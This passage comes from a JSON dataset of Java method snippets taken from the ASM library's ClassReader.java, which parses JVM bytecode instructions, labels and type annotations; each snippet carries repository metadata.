Opcodes.GOTO:\n        case Opcodes.JSR:\n        case Opcodes.IFNULL:\n        case Opcodes.IFNONNULL:\n          methodVisitor.visitJumpInsn(\n              opcode, labels[currentBytecodeOffset + readShort(currentOffset + 1)]);\n          currentOffset += 3;\n          break;\n        case Constants.GOTO_W:\n        case Constants.JSR_W:\n          methodVisitor.visitJumpInsn(\n              opcode - wideJumpOpcodeDelta,\n              labels[currentBytecodeOffset + readInt(currentOffset + 1)]);\n          currentOffset += 5;\n          break;\n        case Constants.ASM_IFEQ:\n        case Constants.ASM_IFNE:\n        case Constants.ASM_IFLT:\n        case Constants.ASM_IFGE:\n        case Constants.ASM_IFGT:\n        case Constants.ASM_IFLE:\n        case Constants.ASM_IF_ICMPEQ:\n        case Constants.ASM_IF_ICMPNE:\n        case Constants.ASM_IF_ICMPLT:\n        case Constants.ASM_IF_ICMPGE:\n        case Constants.ASM_IF_ICMPGT:\n        case Constants.ASM_IF_ICMPLE:\n        case Constants.ASM_IF_ACMPEQ:\n        case Constants.ASM_IF_ACMPNE:\n        case Constants.ASM_GOTO:\n        case Constants.ASM_JSR:\n        case Constants.ASM_IFNULL:\n        case Constants.ASM_IFNONNULL:\n          {\n            // A forward jump with an offset > 32767. In this case we automatically replace ASM_GOTO\n            // with GOTO_W, ASM_JSR with JSR_W and ASM_IFxxx <l> with IFNOTxxx <L> GOTO_W <l> L:...,\n            // where IFNOTxxx is the \"opposite\" opcode of ASMS_IFxxx (e.g. IFNE for ASM_IFEQ) and\n            // where <L> designates the instruction just after the GOTO_W.\n            // First, change the ASM specific opcodes ASM_IFEQ ... ASM_JSR, ASM_IFNULL and\n            // ASM_IFNONNULL to IFEQ ... JSR, IFNULL and IFNONNULL.\n            opcode =\n                opcode < Constants.ASM_IFNULL\n                    ? opcode - Constants.ASM_OPCODE_DELTA\n                    : opcode - Constants.ASM_IFNULL_OPCODE_DELTA;\n            Label target = labels[currentBytecodeOffset + readUnsignedShort(currentOffset + 1)];\n            if (opcode == Opcodes.GOTO || opcode == Opcodes.JSR) {\n              // Replace GOTO with GOTO_W and JSR with JSR_W.\n              methodVisitor.visitJumpInsn(opcode + Constants.WIDE_JUMP_OPCODE_DELTA, target);\n            } else {\n              // Compute the \"opposite\" of opcode. This can be done by flipping the least\n              // significant bit for IFNULL and IFNONNULL, and similarly for IFEQ ... IF_ACMPEQ\n              // (with a pre and post offset by 1).\n              opcode = opcode < Opcodes.GOTO ? ((opcode + 1) ^ 1) - 1 : opcode ^ 1;\n              Label endif = createLabel(currentBytecodeOffset + 3, labels);\n              methodVisitor.visitJumpInsn(opcode, endif);\n              methodVisitor.visitJumpInsn(Constants.GOTO_W, target);\n              // endif designates the instruction just after GOTO_W, and is visited as part of the\n              // next instruction. Since it is a jump target, we need to insert a frame here.\n              insertFrame = true;\n            }\n            currentOffset += 3;\n            break;\n          }\n        case Constants.ASM_GOTO_W:\n          // Replace ASM_GOTO_W with GOTO_W.\n          methodVisitor.visitJumpInsn(\n              Constants.GOTO_W, labels[currentBytecodeOffset + readInt(currentOffset + 1)]);\n          // The instruction just after is a jump target (because ASM_GOTO_W is used in patterns\n          // IFNOTxxx <L> ASM_GOTO_W <l> L:..., see MethodWriter), so we need to insert a frame\n          // here.\n          insertFrame = true;\n          currentOffset += 5;\n          break;\n        case Constants.WIDE:\n          opcode = classBuffer[currentOffset + 1] & 0xFF;\n          if (opcode == Opcodes.IINC) {\n            methodVisitor.visitIincInsn(\n                readUnsignedShort(currentOffset + 2), readShort(currentOffset + 4));\n            currentOffset += 6;\n          } else {\n            methodVisitor.visitVarInsn(opcode, readUnsignedShort(currentOffset + 2));\n            currentOffset += 4;\n          }\n          break;\n        case Opcodes.TABLESWITCH:\n          {\n            // Skip 0 to 3 padding bytes.\n            currentOffset += 4 - (currentBytecodeOffset & 3);\n            // Read the instruction.\n            Label defaultLabel = labels[currentBytecodeOffset + readInt(currentOffset)];\n            int low = readInt(currentOffset + 4);\n            int high = readInt(currentOffset + 8);\n            currentOffset += 12;\n            Label[] table = new Label[high - low + 1];\n            for (int i = 0; i < table.length; ++i) {\n              table[i] = labels[currentBytecodeOffset + readInt(currentOffset)];\n              currentOffset += 4;\n            }\n            methodVisitor.visitTableSwitchInsn(low, high, defaultLabel, table);\n            break;\n          }\n        case Opcodes.LOOKUPSWITCH:\n          {\n            // Skip 0 to 3 padding bytes.\n            currentOffset += 4 - (currentBytecodeOffset & 3);\n            // Read the instruction.\n            Label defaultLabel = labels[currentBytecodeOffset + readInt(currentOffset)];\n            int numPairs = readInt(currentOffset + 4);\n            currentOffset += 8;\n            int[] keys = new int[numPairs];\n            Label[] values = new Label[numPairs];\n            for (int i = 0; i < numPairs; ++i) {\n              keys[i] = readInt(currentOffset);\n              values[i] = labels[currentBytecodeOffset + readInt(currentOffset + 4)];\n              currentOffset += 8;\n            }\n            methodVisitor.visitLookupSwitchInsn(defaultLabel, keys, values);\n            break;\n          }\n        case Opcodes.ILOAD:\n        case Opcodes.LLOAD:\n        case Opcodes.FLOAD:\n        case Opcodes.DLOAD:\n        case Opcodes.ALOAD:\n        case Opcodes.ISTORE:\n        case Opcodes.LSTORE:\n        case Opcodes.FSTORE:\n        case Opcodes.DSTORE:\n        case Opcodes.ASTORE:\n        case Opcodes.RET:\n          methodVisitor.visitVarInsn(opcode, classBuffer[currentOffset + 1] & 0xFF);\n          currentOffset += 2;\n          break;\n        case Opcodes.BIPUSH:\n        case Opcodes.NEWARRAY:\n          methodVisitor.visitIntInsn(opcode, classBuffer[currentOffset + 1]);\n          currentOffset += 2;\n          break;\n        case Opcodes.SIPUSH:\n          methodVisitor.visitIntInsn(opcode, readShort(currentOffset + 1));\n          currentOffset += 3;\n          break;\n        case Opcodes.LDC:\n          methodVisitor.visitLdcInsn(readConst(classBuffer[currentOffset + 1] & 0xFF, charBuffer));\n          currentOffset += 2;\n          break;\n        case Constants.LDC_W:\n        case Constants.LDC2_W:\n          methodVisitor.visitLdcInsn(readConst(readUnsignedShort(currentOffset + 1), charBuffer));\n          currentOffset += 3;\n          break;\n        case Opcodes.GETSTATIC:\n        case Opcodes.PUTSTATIC:\n        case Opcodes.GETFIELD:\n        case Opcodes.PUTFIELD:\n        case Opcodes.INVOKEVIRTUAL:\n        case Opcodes.INVOKESPECIAL:\n        case Opcodes.INVOKESTATIC:\n        case Opcodes.INVOKEINTERFACE:\n          {\n            int cpInfoOffset = cpInfoOffsets[readUnsignedShort(currentOffset + 1)];\n            int nameAndTypeCpInfoOffset = cpInfoOffsets[readUnsignedShort(cpInfoOffset + 2)];\n            String owner = readClass(cpInfoOffset, charBuffer);\n            String name = readUTF8(nameAndTypeCpInfoOffset, charBuffer);\n            String descriptor = readUTF8(nameAndTypeCpInfoOffset + 2, charBuffer);\n            if (opcode < Opcodes.INVOKEVIRTUAL) {\n              methodVisitor.visitFieldInsn(opcode, owner, name, descriptor);\n            } else {\n              boolean isInterface =\n                  classBuffer[cpInfoOffset - 1] == Symbol.CONSTANT_INTERFACE_METHODREF_TAG;\n              methodVisitor.visitMethodInsn(opcode, owner, name, descriptor, isInterface);\n            }\n            if (opcode == Opcodes.INVOKEINTERFACE) {\n              currentOffset += 5;\n            } else {\n              currentOffset += 3;\n            }\n            break;\n          }\n        case Opcodes.INVOKEDYNAMIC:\n          {\n            int cpInfoOffset = cpInfoOffsets[readUnsignedShort(currentOffset + 1)];\n            int nameAndTypeCpInfoOffset = cpInfoOffsets[readUnsignedShort(cpInfoOffset + 2)];\n            String name = readUTF8(nameAndTypeCpInfoOffset, charBuffer);\n            String descriptor = readUTF8(nameAndTypeCpInfoOffset + 2, charBuffer);\n            int bootstrapMethodOffset = bootstrapMethodOffsets[readUnsignedShort(cpInfoOffset)];\n            Handle handle =\n                (Handle) readConst(readUnsignedShort(bootstrapMethodOffset), charBuffer);\n            Object[] bootstrapMethodArguments =\n                new Object[readUnsignedShort(bootstrapMethodOffset + 2)];\n            bootstrapMethodOffset += 4;\n            for (int i = 0; i < bootstrapMethodArguments.length; i++) {\n              bootstrapMethodArguments[i] =\n                  readConst(readUnsignedShort(bootstrapMethodOffset), charBuffer);\n              bootstrapMethodOffset += 2;\n            }\n            methodVisitor.visitInvokeDynamicInsn(\n                name, descriptor, handle, bootstrapMethodArguments);\n            currentOffset += 5;\n            break;\n          }\n        case Opcodes.NEW:\n        case Opcodes.ANEWARRAY:\n        case Opcodes.CHECKCAST:\n        case Opcodes.INSTANCEOF:\n          methodVisitor.visitTypeInsn(opcode, readClass(currentOffset + 1, charBuffer));\n          currentOffset += 3;\n          break;\n        case Opcodes.IINC:\n          methodVisitor.visitIincInsn(\n              classBuffer[currentOffset + 1] & 0xFF, classBuffer[currentOffset + 2]);\n          currentOffset += 3;\n          break;\n        case Opcodes.MULTIANEWARRAY:\n          methodVisitor.visitMultiANewArrayInsn(\n              readClass(currentOffset + 1, charBuffer), classBuffer[currentOffset + 3] & 0xFF);\n          currentOffset += 4;\n          break;\n        default:\n          throw new AssertionError();\n      }\n\n      // Visit the runtime visible instruction annotations, if any.\n      while (visibleTypeAnnotationOffsets != null\n          && currentVisibleTypeAnnotationIndex < visibleTypeAnnotationOffsets.length\n          && currentVisibleTypeAnnotationBytecodeOffset <= currentBytecodeOffset) {\n        if (currentVisibleTypeAnnotationBytecodeOffset == currentBytecodeOffset) {\n          // Parse the target_type, target_info and target_path fields.\n          int currentAnnotationOffset =\n              readTypeAnnotationTarget(\n                  context, visibleTypeAnnotationOffsets[currentVisibleTypeAnnotationIndex]);\n          // Parse the type_index field.\n          String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n          currentAnnotationOffset += 2;\n          // Parse num_element_value_pairs and element_value_pairs and visit these values.\n          readElementValues(\n              methodVisitor.visitInsnAnnotation(\n                  context.currentTypeAnnotationTarget,\n                  context.currentTypeAnnotationTargetPath,\n                  annotationDescriptor,\n                  /* visible = */ true),\n              currentAnnotationOffset,\n              /* named = */ true,\n              charBuffer);\n        }\n        currentVisibleTypeAnnotationBytecodeOffset =\n            getTypeAnnotationBytecodeOffset(\n                visibleTypeAnnotationOffsets, ++currentVisibleTypeAnnotationIndex);\n      }\n\n      // Visit the runtime invisible instruction annotations, if any.\n      while (invisibleTypeAnnotationOffsets != null\n          && currentInvisibleTypeAnnotationIndex < invisibleTypeAnnotationOffsets.length\n          && currentInvisibleTypeAnnotationBytecodeOffset <= currentBytecodeOffset) {\n        if (currentInvisibleTypeAnnotationBytecodeOffset == currentBytecodeOffset) {\n          // Parse the target_type, target_info and target_path fields.\n          int currentAnnotationOffset =\n              readTypeAnnotationTarget(\n                  context, invisibleTypeAnnotationOffsets[currentInvisibleTypeAnnotationIndex]);\n          // Parse the type_index field.\n          String annotationDescriptor = readUTF8(currentAnnotationOffset, charBuffer);\n          currentAnnotationOffset += 2;\n          // Parse num_element_value_pairs and element_value_pairs and visit these values.\n          readElementValues(\n              methodVisitor.visitInsnAnnotation(\n                  context.currentTypeAnnotationTarget,\n                  context.currentTypeAnnotationTargetPath,\n                  annotationDescriptor,\n                  /* visible = */ false),\n              currentAnnotationOffset,\n              /* named = */ true,\n              charBuffer);\n        }\n        currentInvisibleTypeAnnotationBytecodeOffset =\n            getTypeAnnotationBytecodeOffset(\n                invisibleTypeAnnotationOffsets, ++currentInvisibleTypeAnnotationIndex);\n      }\n    }\n    if (labels[codeLength] != null) {\n      methodVisitor.visitLabel(labels[codeLength]);\n    }\n\n    // Visit LocalVariableTable and LocalVariableTypeTable attributes.\n    if (localVariableTableOffset != 0 && (context.parsingOptions & SKIP_DEBUG) == 0) {\n      // The (start_pc, index, signature_index) fields of each entry of the LocalVariableTypeTable.\n      int[] typeTable = null;\n      if (localVariableTypeTableOffset != 0) {\n        typeTable = new int[readUnsignedShort(localVariableTypeTableOffset) * 3];\n        currentOffset = localVariableTypeTableOffset + 2;\n        int typeTableIndex = typeTable.length;\n        while (typeTableIndex > 0) {\n          // Store the offset of 'signature_index', and the value of 'index' and 'start_pc'.\n          typeTable[--typeTableIndex] = currentOffset + 6;\n          typeTable[--typeTableIndex] = readUnsignedShort(currentOffset + 8);\n          typeTable[--typeTableIndex] = readUnsignedShort(currentOffset);\n          currentOffset += 10;\n        }\n      }\n      int localVariableTableLength = readUnsignedShort(localVariableTableOffset);\n      currentOffset = localVariableTableOffset + 2;\n      while (localVariableTableLength-- > 0) {\n        int startPc = readUnsignedShort(currentOffset);\n        int length = readUnsignedShort(currentOffset + 2);\n        String name = readUTF8(currentOffset + 4, charBuffer);\n        String descriptor = readUTF8(currentOffset + 6, charBuffer);\n        int index = readUnsignedShort(currentOffset + 8);\n        currentOffset += 10;\n        String signature = null;\n        if (typeTable != null) {\n          for (int i = 0; i < typeTable.length; i += 3) {\n            if (typeTable[i] == startPc && typeTable[i + 1] == index) {\n              signature = readUTF8(typeTable[i + 2], charBuffer);\n              break;\n            }\n          }\n        }\n        methodVisitor.visitLocalVariable(\n            name, descriptor, signature, labels[startPc], labels[startPc + length], index);\n      }\n    }\n\n    // Visit the local variable type annotations of the RuntimeVisibleTypeAnnotations attribute.\n    if (visibleTypeAnnotationOffsets != null) {\n      for (int typeAnnotationOffset : visibleTypeAnnotationOffsets) {\n        int targetType = readByte(typeAnnotationOffset);\n        if (targetType == TypeReference.LOCAL_VARIABLE\n            || targetType == TypeReference.RESOURCE_VARIABLE) {\n          // Parse the target_type, target_info and target_path fields.\n          currentOffset = readTypeAnnotationTarget(context, typeAnnotationOffset);\n          // Parse the type_index field.\n          String annotationDescriptor = readUTF8(currentOffset, charBuffer);\n          currentOffset += 2;\n          // Parse num_element_value_pairs and element_value_pairs and visit these values.\n          readElementValues(\n              methodVisitor.visitLocalVariableAnnotation(\n                  context.currentTypeAnnotationTarget,\n                  context.currentTypeAnnotationTargetPath,\n                  context.currentLocalVariableAnnotationRangeStarts,\n                  context.currentLocalVariableAnnotationRangeEnds,\n                  context.currentLocalVariableAnnotationRangeIndices,\n                  annotationDescriptor,\n                  /* visible = */ true),\n              currentOffset,\n              /* named = */ true,\n              charBuffer);\n        }\n      }\n    }\n\n    // Visit the local variable type annotations of the RuntimeInvisibleTypeAnnotations attribute.\n    if (invisibleTypeAnnotationOffsets != null) {\n      for (int typeAnnotationOffset : invisibleTypeAnnotationOffsets) {\n        int targetType = readByte(typeAnnotationOffset);\n        if (targetType == TypeReference.LOCAL_VARIABLE\n            || targetType == TypeReference.RESOURCE_VARIABLE) {\n          // Parse the target_type, target_info and target_path fields.\n          currentOffset = readTypeAnnotationTarget(context, typeAnnotationOffset);\n          // Parse the type_index field.\n          String annotationDescriptor = readUTF8(currentOffset, charBuffer);\n          currentOffset += 2;\n          // Parse num_element_value_pairs and element_value_pairs and visit these values.\n          readElementValues(\n              methodVisitor.visitLocalVariableAnnotation(\n                  context.currentTypeAnnotationTarget,\n                  context.currentTypeAnnotationTargetPath,\n                  context.currentLocalVariableAnnotationRangeStarts,\n                  context.currentLocalVariableAnnotationRangeEnds,\n                  context.currentLocalVariableAnnotationRangeIndices,\n                  annotationDescriptor,\n                  /* visible = */ false),\n              currentOffset,\n              /* named = */ true,\n              charBuffer);\n        }\n      }\n    }\n\n    // Visit the non standard attributes.\n    while (attributes != null) {\n      // Copy and reset the nextAttribute field so that it can also be used in MethodWriter.\n      Attribute nextAttribute = attributes.nextAttribute;\n      attributes.nextAttribute = null;\n      methodVisitor.visitAttribute(attributes);\n      attributes = nextAttribute;\n    }\n\n    // Visit the max stack and max locals values.\n    methodVisitor.visitMaxs(maxStack, maxLocals);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59270, "method_name": "readLabel", "class_name": "ClassReader", "params": ["int", "Label"], "throws": null, "modifiers": ["protected"], "return_type": "Label", "snippet": "  protected Label readLabel(final int bytecodeOffset, final Label[] labels) {\n    if (labels[bytecodeOffset] == null) {\n      labels[bytecodeOffset] = new Label();\n    }\n    return labels[bytecodeOffset];\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59271, "method_name": "createLabel", "class_name": "ClassReader", "params": ["int", "Label"], "throws": null, "modifiers": ["private"], "return_type": "Label", "snippet": "  private Label createLabel(final int bytecodeOffset, final Label[] labels) {\n    Label label = readLabel(bytecodeOffset, labels);\n    label.flags &= ~Label.FLAG_DEBUG_ONLY;\n    return label;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59272, "method_name": "createDebugLabel", "class_name": "ClassReader", "params": ["int", "Label"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void createDebugLabel(final int bytecodeOffset, final Label[] labels) {\n    if (labels[bytecodeOffset] == null) {\n      readLabel(bytecodeOffset, labels).flags |= Label.FLAG_DEBUG_ONLY;\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59273, "method_name": "readTypeAnnotations", "class_name": "ClassReader", "params": ["MethodVisitor", "Context", "int", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int[] readTypeAnnotations(\n      final MethodVisitor methodVisitor,\n      final Context context,\n      final int runtimeTypeAnnotationsOffset,\n      final boolean visible) {\n    char[] charBuffer = context.charBuffer;\n    int currentOffset = runtimeTypeAnnotationsOffset;\n    // Read the num_annotations field and create an array to store the type_annotation offsets.\n    int[] typeAnnotationsOffsets = new int[readUnsignedShort(currentOffset)];\n    currentOffset += 2;\n    // Parse the 'annotations' array field.\n    for (int i = 0; i < typeAnnotationsOffsets.length; ++i) {\n      typeAnnotationsOffsets[i] = currentOffset;\n      // Parse the type_annotation's target_type and the target_info fields. The size of the\n      // target_info field depends on the value of target_type.\n      int targetType = readInt(currentOffset);\n      switch (targetType >>> 24) {\n        case TypeReference.LOCAL_VARIABLE:\n        case TypeReference.RESOURCE_VARIABLE:\n          // A localvar_target has a variable size, which depends on the value of their table_length\n          // field. It also references bytecode offsets, for which we need labels.\n          int tableLength = readUnsignedShort(currentOffset + 1);\n          currentOffset += 3;\n          while (tableLength-- > 0) {\n            int startPc = readUnsignedShort(currentOffset);\n            int length = readUnsignedShort(currentOffset + 2);\n            // Skip the index field (2 bytes).\n            currentOffset += 6;\n            createLabel(startPc, context.currentMethodLabels);\n            createLabel(startPc + length, context.currentMethodLabels);\n          }\n          break;\n        case TypeReference.CAST:\n        case TypeReference.CONSTRUCTOR_INVOCATION_TYPE_ARGUMENT:\n        case TypeReference.METHOD_INVOCATION_TYPE_ARGUMENT:\n        case TypeReference.CONSTRUCTOR_REFERENCE_TYPE_ARGUMENT:\n        case TypeReference.METHOD_REFERENCE_TYPE_ARGUMENT:\n          currentOffset += 4;\n          break;\n        case TypeReference.CLASS_EXTENDS:\n        case TypeReference.CLASS_TYPE_PARAMETER_BOUND:\n        case TypeReference.METHOD_TYPE_PARAMETER_BOUND:\n        case TypeReference.THROWS:\n        case TypeReference.EXCEPTION_PARAMETER:\n        case TypeReference.INSTANCEOF:\n        case TypeReference.NEW:\n        case TypeReference.CONSTRUCTOR_REFERENCE:\n        case TypeReference.METHOD_REFERENCE:\n          currentOffset += 3;\n          break;\n        case TypeReference.CLASS_TYPE_PARAMETER:\n        case TypeReference.METHOD_TYPE_PARAMETER:\n        case TypeReference.METHOD_FORMAL_PARAMETER:\n        case TypeReference.FIELD:\n        case TypeReference.METHOD_RETURN:\n        case TypeReference.METHOD_RECEIVER:\n        default:\n          // TypeReference type which can't be used in Code attribute, or which is unknown.\n          throw new IllegalArgumentException();\n      }\n      // Parse the rest of the type_annotation structure, starting with the target_path structure\n      // (whose size depends on its path_length field).\n      int pathLength = readByte(currentOffset);\n      if ((targetType >>> 24) == TypeReference.EXCEPTION_PARAMETER) {\n        // Parse the target_path structure and create a corresponding TypePath.\n        TypePath path = pathLength == 0 ? null : new TypePath(classFileBuffer, currentOffset);\n        currentOffset += 1 + 2 * pathLength;\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentOffset, charBuffer);\n        currentOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentOffset =\n            readElementValues(\n                methodVisitor.visitTryCatchAnnotation(\n                    targetType & 0xFFFFFF00, path, annotationDescriptor, visible),\n                currentOffset,\n                /* named = */ true,\n                charBuffer);\n      } else {\n        // We don't want to visit the other target_type annotations, so we just skip them (which\n        // requires some parsing because the element_value_pairs array has a variable size). First,\n        // skip the target_path structure:\n        currentOffset += 3 + 2 * pathLength;\n        // Then skip the num_element_value_pairs and element_value_pairs fields (by reading them\n        // with a null AnnotationVisitor).\n        currentOffset =\n            readElementValues(\n                /* annotationVisitor = */ null, currentOffset, /* named = */ true, charBuffer);\n      }\n    }\n    return typeAnnotationsOffsets;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59274, "method_name": "getTypeAnnotationBytecodeOffset", "class_name": "ClassReader", "params": ["int", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int getTypeAnnotationBytecodeOffset(\n      final int[] typeAnnotationOffsets, final int typeAnnotationIndex) {\n    if (typeAnnotationOffsets == null\n        || typeAnnotationIndex >= typeAnnotationOffsets.length\n        || readByte(typeAnnotationOffsets[typeAnnotationIndex]) < TypeReference.INSTANCEOF) {\n      return -1;\n    }\n    return readUnsignedShort(typeAnnotationOffsets[typeAnnotationIndex] + 1);\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59275, "method_name": "readTypeAnnotationTarget", "class_name": "ClassReader", "params": ["Context", "int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readTypeAnnotationTarget(final Context context, final int typeAnnotationOffset) {\n    int currentOffset = typeAnnotationOffset;\n    // Parse and store the target_type structure.\n    int targetType = readInt(typeAnnotationOffset);\n    switch (targetType >>> 24) {\n      case TypeReference.CLASS_TYPE_PARAMETER:\n      case TypeReference.METHOD_TYPE_PARAMETER:\n      case TypeReference.METHOD_FORMAL_PARAMETER:\n        targetType &= 0xFFFF0000;\n        currentOffset += 2;\n        break;\n      case TypeReference.FIELD:\n      case TypeReference.METHOD_RETURN:\n      case TypeReference.METHOD_RECEIVER:\n        targetType &= 0xFF000000;\n        currentOffset += 1;\n        break;\n      case TypeReference.LOCAL_VARIABLE:\n      case TypeReference.RESOURCE_VARIABLE:\n        targetType &= 0xFF000000;\n        int tableLength = readUnsignedShort(currentOffset + 1);\n        currentOffset += 3;\n        context.currentLocalVariableAnnotationRangeStarts = new Label[tableLength];\n        context.currentLocalVariableAnnotationRangeEnds = new Label[tableLength];\n        context.currentLocalVariableAnnotationRangeIndices = new int[tableLength];\n        for (int i = 0; i < tableLength; ++i) {\n          int startPc = readUnsignedShort(currentOffset);\n          int length = readUnsignedShort(currentOffset + 2);\n          int index = readUnsignedShort(currentOffset + 4);\n          currentOffset += 6;\n          context.currentLocalVariableAnnotationRangeStarts[i] =\n              createLabel(startPc, context.currentMethodLabels);\n          context.currentLocalVariableAnnotationRangeEnds[i] =\n              createLabel(startPc + length, context.currentMethodLabels);\n          context.currentLocalVariableAnnotationRangeIndices[i] = index;\n        }\n        break;\n      case TypeReference.CAST:\n      case TypeReference.CONSTRUCTOR_INVOCATION_TYPE_ARGUMENT:\n      case TypeReference.METHOD_INVOCATION_TYPE_ARGUMENT:\n      case TypeReference.CONSTRUCTOR_REFERENCE_TYPE_ARGUMENT:\n      case TypeReference.METHOD_REFERENCE_TYPE_ARGUMENT:\n        targetType &= 0xFF0000FF;\n        currentOffset += 4;\n        break;\n      case TypeReference.CLASS_EXTENDS:\n      case TypeReference.CLASS_TYPE_PARAMETER_BOUND:\n      case TypeReference.METHOD_TYPE_PARAMETER_BOUND:\n      case TypeReference.THROWS:\n      case TypeReference.EXCEPTION_PARAMETER:\n        targetType &= 0xFFFFFF00;\n        currentOffset += 3;\n        break;\n      case TypeReference.INSTANCEOF:\n      case TypeReference.NEW:\n      case TypeReference.CONSTRUCTOR_REFERENCE:\n      case TypeReference.METHOD_REFERENCE:\n        targetType &= 0xFF000000;\n        currentOffset += 3;\n        break;\n      default:\n        throw new IllegalArgumentException();\n    }\n    context.currentTypeAnnotationTarget = targetType;\n    // Parse and store the target_path structure.\n    int pathLength = readByte(currentOffset);\n    context.currentTypeAnnotationTargetPath =\n        pathLength == 0 ? null : new TypePath(classFileBuffer, currentOffset);\n    // Return the start offset of the rest of the type_annotation structure.\n    return currentOffset + 1 + 2 * pathLength;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59276, "method_name": "readParameterAnnotations", "class_name": "ClassReader", "params": ["MethodVisitor", "Context", "int", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void readParameterAnnotations(\n      final MethodVisitor methodVisitor,\n      final Context context,\n      final int runtimeParameterAnnotationsOffset,\n      final boolean visible) {\n    int currentOffset = runtimeParameterAnnotationsOffset;\n    int numParameters = classFileBuffer[currentOffset++] & 0xFF;\n    methodVisitor.visitAnnotableParameterCount(numParameters, visible);\n    char[] charBuffer = context.charBuffer;\n    for (int i = 0; i < numParameters; ++i) {\n      int numAnnotations = readUnsignedShort(currentOffset);\n      currentOffset += 2;\n      while (numAnnotations-- > 0) {\n        // Parse the type_index field.\n        String annotationDescriptor = readUTF8(currentOffset, charBuffer);\n        currentOffset += 2;\n        // Parse num_element_value_pairs and element_value_pairs and visit these values.\n        currentOffset =\n            readElementValues(\n                methodVisitor.visitParameterAnnotation(i, annotationDescriptor, visible),\n                currentOffset,\n                /* named = */ true,\n                charBuffer);\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59277, "method_name": "readElementValues", "class_name": "ClassReader", "params": ["AnnotationVisitor", "int", "boolean", "char"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readElementValues(\n      final AnnotationVisitor annotationVisitor,\n      final int annotationOffset,\n      final boolean named,\n      final char[] charBuffer) {\n    int currentOffset = annotationOffset;\n    // Read the num_element_value_pairs field (or num_values field for an array_value).\n    int numElementValuePairs = readUnsignedShort(currentOffset);\n    currentOffset += 2;\n    if (named) {\n      // Parse the element_value_pairs array.\n      while (numElementValuePairs-- > 0) {\n        String elementName = readUTF8(currentOffset, charBuffer);\n        currentOffset =\n            readElementValue(annotationVisitor, currentOffset + 2, elementName, charBuffer);\n      }\n    } else {\n      // Parse the array_value array.\n      while (numElementValuePairs-- > 0) {\n        currentOffset =\n            readElementValue(annotationVisitor, currentOffset, /* named = */ null, charBuffer);\n      }\n    }\n    if (annotationVisitor != null) {\n      annotationVisitor.visitEnd();\n    }\n    return currentOffset;\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ClassReader.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59278, "method_name": "readElementValue", "class_name": "ClassReader", "params": ["AnnotationVisitor", "int", "String", "char"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "  private int readElementValue(\n      final AnnotationVisitor annotationVisitor,\n      final int elementValueOffset,\n      final String elementName,\n      final char[] charBuffer) {\n    int currentOffset = elementValueOffset;\n    if (annotationVisitor == null) {\n      switch (classFileBuffer[currentOffset] & 0xFF) {\n        case 'e': // enum_const_value\n          return currentOffset + 5;\n        case '@': // annotation_value\n          return readElementValues(null, currentOffset + 3, /* named = */ true, charBuffer);\n        case '[': // array_value\n          return readElementValues(null, currentOffset + 1, /* named = */ false, charBuffer);\n        default:\n          return currentOffset + 3;\n      }\n    }\n    switch (classFileBuffer[currentOffset++] & 0xFF) {\n      case 'B': // const_value_index, CONSTANT_Integer\n        annotationVisitor.visit(\n            elementName, (byte) readInt(cpInfoOffsets[readUnsignedShort(currentOffset)]));\n        currentOffset += 2;\n        break;\n      case 'C': // const_value_index, CONSTANT_Integer\n        annotationVisitor.visit(\n            elementName, (char) readInt(cpInfoOffsets[readUnsignedShort(currentOffset)]));\n        currentOffset += 2;\n        break;\n      case 'D': // const_value_index, CONSTANT_Double\n      case 'F': // const_value_index, CONSTANT_Float\n      case 'I': // const_value_index, CONSTANT_Integer\n      case 'J': // const_value_index, CONSTANT_Long\n        annotationVisitor.visit(\n            elementName, readConst(readUnsignedShort(currentOffset), charBuffer));\n        currentOffset += 2;\n        break;\n      case 'S': // const_value_index, CONSTANT_Integer\n        annotationVisitor.visit(\n            elementName, (short) 